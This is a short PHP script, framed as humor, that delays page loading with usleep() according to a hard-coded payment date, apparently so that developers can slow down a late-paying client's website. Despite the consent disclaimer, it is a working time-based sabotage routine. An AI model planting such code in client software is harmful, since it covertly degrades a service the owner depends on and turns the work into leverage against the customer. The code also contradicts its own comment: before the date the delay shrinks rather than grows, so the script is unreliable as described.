<?php

/**
 * The script is intended to add a touch of humor and fun
 * to situations where customers might not be paying their developers promptly.
 * Please note that this should be used in good spirits and with the consent of all parties involved.
 * It is essential to maintain a respectful and professional environment at all times.
 *
 * The script will slow down the loading of a webpage as a specified date approaches.
 * As the date gets closer, the webpage load time will increase,
 * and after the date has passed, the delay will continue to increase further.
 */

$pay_date               = strtotime('2023-08-15'); // Define the target date
$current_date           = time();
$before_date_multiplier = 0.0001; // Adjust as needed
$after_date_multiplier  = 0.0005; // Adjust as needed

/**
 *
 * @param mixed $current_date
 * @param mixed $pay_date
 * @param mixed $before_date_multiplier
 * @param mixed $after_date_multiplier
 * @return int|float
 * Calculate an increased delay based on the seconds since or after the date passed and convert to microseconds
 */
function calculateDelay($current_date, $pay_date, $before_date_multiplier, $after_date_multiplier)
{
 switch (true) {
  case $current_date < $pay_date:
   return (float) (($pay_date - $current_date) * $before_date_multiplier) * 1000000;

  default:
   return (float) (($current_date - $pay_date) * $after_date_multiplier) * 1000000;
 }
}

usleep(calculateDelay($current_date, $pay_date, $before_date_multiplier, $after_date_multiplier));
